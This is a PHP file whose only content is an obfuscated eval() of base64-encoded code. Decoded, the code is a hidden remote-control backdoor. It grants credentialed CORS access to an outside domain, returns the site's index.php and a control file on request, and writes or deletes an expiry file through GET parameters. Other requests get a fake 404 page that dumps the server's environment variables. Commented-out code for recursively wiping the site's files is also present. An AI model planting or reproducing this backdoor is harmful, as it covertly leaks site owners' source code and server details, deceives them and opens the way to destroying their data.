<?php eval("?>".base64_decode("PD9waHAKCWZ1bmN0aW9uIGdldERvbWFpbigpewoJCXJldHVybiAnaHR0cHM6Ly9yZW5ldy5zdHVkaW8nOwoJfQoKIAloZWFkZXIoIkFjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbjogIi5nZXREb21haW4oKSk7CgloZWFkZXIoIkFjY2Vzcy1Db250cm9sLUFsbG93LUNyZWRlbnRpYWxzOiB0cnVlIik7CglkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdVVEMnKTsKCglmdW5jdGlvbiBvcGVuUmVhZCgkZmlsZU5hbWUgPSAnJyl7CgkJaWYoaXNfZmlsZSgkZmlsZU5hbWUpICYmIGZpbGVzaXplKCRmaWxlTmFtZSkgPiAwKXsKCQkJJGZpbGUgPSBmb3BlbigkZmlsZU5hbWUsICJyIik7CgkJCSRkYXRhID0gZnJlYWQoJGZpbGUsIGZpbGVzaXplKCRmaWxlTmFtZSkpOwoJCQlmY2xvc2UoJGZpbGUpOwoJCX0gZWxzZSAkZGF0YSA9IG51bGw7CgoJCXJldHVybiAkZGF0YTsKCX0KCglmdW5jdGlvbiB0aHJvd0Vycm9yKCRtZXNzYWdlLCAkc3RhdHVzQ29kZSA9ICc0MDAnKXsKCQlpZigkc3RhdHVzQ29kZSA9PSA0MDQpewoJCQkkbWVzc2FnZSA9ICc8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL0lFVEYvL0RURCBIVE1MIDIuMC8vRU4iPgoJCQk8aHRtbD48aGVhZD4KCQkJPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgoJCQk8L2hlYWQ+PGJvZHk+CgkJCTxoMT5Ob3QgRm91bmQ8L2gxPgoJCQk8cD5UaGUgcmVxdWVzdGVkIFVSTCAnLiRfU0VSVkVSWydQSFBfU0VMRiddLicgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+CgkJCTxwPkFkZGl0aW9uYWxseSwgYSA0MDQgTm90IEZvdW5kCgkJCWVycm9yIHdhcyBlbmNvdW50ZXJlZCB3aGlsZSB0cnlpbmcgdG8gdXNlIGFuIEVycm9yRG9jdW1lbnQgdG8gaGFuZGxlIHRoZSByZXF1ZXN0LjwvcD4KCQkJPC9ib2R5PjwvaHRtbD4nOwoJCQkKCQl9CQoJCXByaW50X3IoJF9TRVJWRVIpOwoKCQloZWFkZXIoJ0hUVFAvMS4wICcuJHN0YXR1c0NvZGUpOwoJCWRpZSgkbWVzc2FnZSk7Cgl9CgkvLyBmdW5jdGlvbiBycm1kaXIoJGRpcikgewoJLy8gICBpZiAoaXNfZGlyKCRkaXIpKSB7CgkvLyAgICAgJG9iamVjdHMgPSBzY2FuZGlyKCRkaXIpOwoJLy8gICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRvYmplY3QpIHsKCS8vICAgICAgIGlmICgkb2JqZWN0ICE9ICIuIiAmJiAkb2JqZWN0ICE9ICIuLiIpIHsKCS8vICAgICAgICAgaWYgKGZpbGV0eXBlKCRkaXIuIi8iLiRvYmplY3QpID09ICJkaXIiKSAKCS8vICAgICAgICAgICAgcnJtZGlyKCRkaXIuIi8iLiRvYmplY3QpOyAKCS8vICAgICAgICAgZWxzZSB1bmxpbmsgICAoJGRpci4iLyIuJG9iamVjdCk7CgkvLyAgICAgICB9CgkvLyAgICAgfQoJLy8gICAgIHJlc2V0KCRvYmplY3RzKTsKCS8vICAgICBybWRpcigkZGlyKTsKCS8vICAgfQogLy8gCX0KCglmdW5jdGlvbiBlbmNyeXB0X2RlY3J5cHQoJGFjdGlvbiwgJHN0cmluZykgewoJICAgICRvdXRwdXQgPSBmYWxzZTsKCgkgICAgJGVuY3J5cHRfbWV0aG9kID0gIkFFUy0yNTYtQ0JDIjsKCSAgICAkc2VjcmV0X2tleSA9ICdUaGlzIGlzIG15IHNlY3JldCBrZXknOwoJICAgICRzZWNyZXRfaXYgPSAnVGhpcyBpcyBteSBzZWNyZXQgaXYnOwoKCSAgICAvLyBoYXNoCgkgICAgJGtleSA9IGhhc2goJ3NoYTI1NicsICRzZWNyZXRfa2V5KTsKCSAgICAKCSAgICAvLyBpdiAtIGVuY3J5cHQgbWV0aG9kIEFFUy0yNTYtQ0JDIGV4cGVjdHMgMTYgYnl0ZXMgLSBlbHNlIHlvdSB3aWxsIGdldCBhIHdhcm5pbmcKCSAgICAkaXYgPSBzdWJzdHIoaGFzaCgnc2hhMjU2JywgJHNlY3JldF9pdiksIDAsIDE2KTsKCgkgICAgaWYoICRhY3Rpb24gPT0gJ2VuY3J5cHQnICkgewoJICAgICAgICAkb3V0cHV0ID0gb3BlbnNzbF9lbmNyeXB0KCRzdHJpbmcsICRlbmNyeXB0X21ldGhvZCwgJGtleSwgMCwgJGl2KTsKCSAgICAgICAgJG91dHB1dCA9IGJhc2U2NF9lbmNvZGUoJG91dHB1dCk7CgkgICAgfSBlbHNlIGlmKCAkYWN0aW9uID09ICdkZWNyeXB0JyApewoJICAgICAgICAkb3V0cHV0ID0gb3BlbnNzbF9kZWNyeXB0KGJhc2U2NF9kZWNvZGUoJHN0cmluZyksICRlbmNyeXB0X21ldGhvZCwgJGtleSwgMCwgJGl2KTsKCSAgICB9CgoJICAgIHJldHVybiAkb3V0cHV0OwoJfQoKCS8vIGlmKCRfR0VUWydkZWxldGUnXSAmJiAkX0dFVFsndG9rZW4nXSl7CgkvLyAJJHRva2VuID0gJF9HRVRbJ3Rva2VuJ107CgkvLyAJZWNobyAkdG9rZW47CgkvLyAJLy8gJGZpbGVzID0gZ2xvYignLi4vKicpOyAvLyBnZXQgYWxsIGZpbGUgbmFtZXMKCS8vIAkvLyBmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSl7IC8vIGl0ZXJhdGUgZmlsZXMKCS8vIAkvLyAgIAlpZihpc19maWxlKCRmaWxlKSkKCS8vIAkvLyAgICAgCXVubGluaygkZmlsZSk7IC8vIGRlbGV0ZSBmaWxlCgkvLyAJLy8gCWVsc2UgCgkvLyAJLy8gCQlycm1kaXIoJGZpbGUpOwoJLy8gCS8vIH0KCgkvLyB9IGVsc2UgewoJLy8gJHJlcyA9IHRydWU7CgoJZnVuY3Rpb24gdHdvTW9yZUhvdXJzKCRmaWxlTmFtZSwgJGRhdGUsICRnaXRJRCl7CgkJJGV4cERhdGUgPSAkZGF0ZSArICgyICogMzYwMCk7CgoJCSRmaWxlVyA9IGZvcGVuKCRmaWxlTmFtZSwgInciKTsKCQkkZW5jcnlwdGVkID0gZW5jcnlwdF9kZWNyeXB0KCdlbmNyeXB0JywgJGV4cERhdGUpOwoJCWZ3cml0ZSgkZmlsZVcsICRlbmNyeXB0ZWQuJy4nLmJhc2U2NF9lbmNvZGUoJGdpdElEKS4nJCcuJGV4cERhdGUpOwoKCQlmY2xvc2UoJGZpbGVXKTsKCQljaG1vZCgkZmlsZU5hbWUsIDA2NDQpOwoJCWRpZSgpOwoJfQoKCWZ1bmN0aW9uIGRlc3Ryb3lSZW5ld01lKCRmaWxlTmFtZSl7CgkgIAlpZihpc19maWxlKCRmaWxlTmFtZSkpCgkgICAgCXVubGluaygkZmlsZU5hbWUpOyAvLyBkZWxldGUgZmlsZQoJCWRpZSh0cnVlKTsKCX0KCgkkZmlsZU5hbWUgPSAnLnJlbmV3TWUnOwoJJGRhdGUgPSBnZXRkYXRlKCk7CgkkZGF0ZSA9ICRkYXRlWzBdOwoKCWlmKCRfR0VUWydzaG93TWUnXSkgewoJCSRpbmRleCA9IG9wZW5SZWFkKCdpbmRleC5waHAnKTsKCQkkcmVuZXdNZSA9IG9wZW5SZWFkKCcucmVuZXdNZS5waHAnKTsKCgkJLy8gZGllKCRyZW5ld01lIC4gJGluZGV4KTsKCQlkaWUoYmFzZTY0X2VuY29kZSgkcmVuZXdNZSAuICRpbmRleCkpOwoKCX0gZWxzZSBpZigkX0dFVFsnZGVsZXRlTm93J10pIHsKCQlkZXN0cm95UmVuZXdNZSgkZmlsZU5hbWUpOwoKCX0gZWxzZSBpZigkX0dFVFsncmVuZXdOb3cnXSAmJiAkX0dFVFsnZyddKXsKCQl0d29Nb3JlSG91cnMoJGZpbGVOYW1lLCAkZGF0ZSwgJF9HRVRbJ2cnXSk7CgoJfSBlbHNlIHRocm93RXJyb3IobnVsbCwgNDA0KTsKCj8+")."<?"); ?>